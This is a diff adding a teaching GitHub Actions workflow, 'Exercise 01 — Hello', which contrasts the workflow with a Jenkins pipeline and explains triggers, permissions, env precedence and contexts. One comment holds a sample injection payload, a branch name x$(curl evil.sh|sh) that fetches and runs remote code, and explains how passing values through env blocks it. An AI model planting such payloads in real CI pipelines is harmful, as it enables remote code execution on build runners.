@@ -1,0 +1,142 @@
+# -----------------------------------------------------------------------------
+# Exercise 01 — Hello World
+#
+# The Jenkins pipeline this replaces:
+#
+#   pipeline {
+#     agent any
+#     stages {
+#       stage('hello') {
+#         steps { sh 'echo "Hello from ..."' }
+#       }
+#     }
+#   }
+#
+# Four differences that actually bite:
+#
+#   1. A Jenkinsfile is ONE pipeline. Every file in .github/workflows/ is a
+#      separate, independent workflow. They run in parallel and know nothing
+#      about each other. There is no "the pipeline" any more.
+#   2. `agent any` becomes `runs-on:`. A job without `runs-on` is invalid —
+#      this is broken/b1.
+#   3. Jenkins stages run in order. Here jobs run in PARALLEL unless you add
+#      `needs:`. Only one job in this file, so it does not matter yet.
+#   4. The "Build with Parameters" button becomes `workflow_dispatch`.
+# -----------------------------------------------------------------------------
+
+name: "01 - Hello"
+
+# `on:` is the trigger block. This workflow fires on:
+#
+#   push              every branch, every push (no `branches:` filter)
+#   workflow_dispatch the manual "Run workflow" button in the Actions tab
+#
+# To narrow it down you would add filters:
+#
+#   push:
+#     branches: [main]
+#     paths: ['app/**']
+#
+# Careful: a filtered trigger that does not match means the workflow is
+# SKIPPED. If that workflow backs a required status check, the check never
+# reports and the PR can never merge. (Same trap as lint.yml.)
+on:
+  push:
+  workflow_dispatch:
+
+# Least privilege. With no `permissions:` block a job gets the repository
+# default, which is often read/write. Ask for what you need, nothing more.
+permissions:
+  contents: read
+
+# Workflow-level env. There are three levels — workflow, job, step — and the
+# innermost one wins. Useful for values shared by every job.
+env:
+  GREETING: "Hello from the WORKFLOW-level env block"
+
+jobs:
+  hello:
+    name: Say hello
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+
+    steps:
+      # ── Step 1: contexts ──────────────────────────────────────────────────
+      # `${{ ... }}` is substituted by the runner BEFORE bash ever sees the
+      # line: the value is pasted into your script as raw text. `$VAR` is a
+      # real environment variable that the shell reads as data.
+      #
+      # For anything an outsider can influence, that difference is the whole
+      # ballgame. A git branch name may legally contain $, backtick, ; and
+      # (), so a branch called  x$(curl evil.sh|sh)  turns
+      #     echo "on ${{ github.ref_name }}"
+      # into executing that curl. See broken/b7.
+      - name: Say hello
+        env:
+          # Untrusted: pass through env so it stays data.
+          REF_NAME: ${{ github.ref_name }}
+          ACTOR: ${{ github.actor }}
+        run: |
+          echo "Hello from $ACTOR on $REF_NAME"
+
+          # These three have a fixed format and cannot carry a payload, so
+          # the inline form is safe — and shows you the other syntax.
+          echo "event:      ${{ github.event_name }}"
+          echo "repository: ${{ github.repository }}"
+          echo "run number: ${{ github.run_number }}"
+
+      # ── Step 2: default environment variables ─────────────────────────────
+      # These need no `${{ }}`; the runner injects them into every step.
+      #
+      # Note there is NO checkout step above. Runners start with an EMPTY
+      # workspace — unlike a Jenkins multibranch job, nothing is cloned for
+      # you. This job only echoes, so it does not care. broken/b2 is exactly
+      # the mistake of assuming otherwise.
+      - name: Show the runner environment
+        env:
+          # Passing a context value through `env:` instead of inlining it
+          # into the script is the habit that makes b7 impossible.
+          GIT_SHA: ${{ github.sha }}
+        run: |
+          echo "OS:        $RUNNER_OS"
+          echo "Arch:      $RUNNER_ARCH"
+          echo "Workspace: $GITHUB_WORKSPACE"
+          echo "Commit:    $GIT_SHA"
+          echo "Short:     ${GIT_SHA:0:7}"
+          echo "Ref:       $GITHUB_REF"
+          echo "Runner:    $RUNNER_NAME"
+          echo "Temp dir:  $RUNNER_TEMP"
+          uname -a
+          echo "--- workspace contents ---"
+          ls -la "$GITHUB_WORKSPACE"
+
+      # ── Step 3: env precedence ────────────────────────────────────────────
+      # Same variable name as the workflow-level block above. The step-level
+      # value wins for this step only.
+      - name: Show env precedence
+        env:
+          GREETING: "Hello from the STEP-level env block"
+        run: |
+          echo "1) step override:     $GREETING"
+          echo "2) shell var:         ${{ env.GREETING }}"
+          echo "3) literal shell var: $GREETING"
+
+      # ── Step 4: the whole github context ──────────────────────────────────
+      # `run: echo '${{ toJSON(github) }}'` is the classic trick, but a log is
+      # a terrible place to read JSON. `$GITHUB_STEP_SUMMARY` renders markdown
+      # on the run page instead. `if: always()` makes it run even when an
+      # earlier step failed — which is exactly when you want this.
+      - name: Dump the github context
+        if: always()
+        env:
+          GITHUB_CONTEXT: ${{ toJSON(github) }}
+        run: |
+          {
+            echo "<details><summary>github context</summary>"
+            echo
+            echo '```json'
+            echo "$GITHUB_CONTEXT"
+            echo '```'
+            echo
+            echo "</details>"
+          } >> "$GITHUB_STEP_SUMMARY"
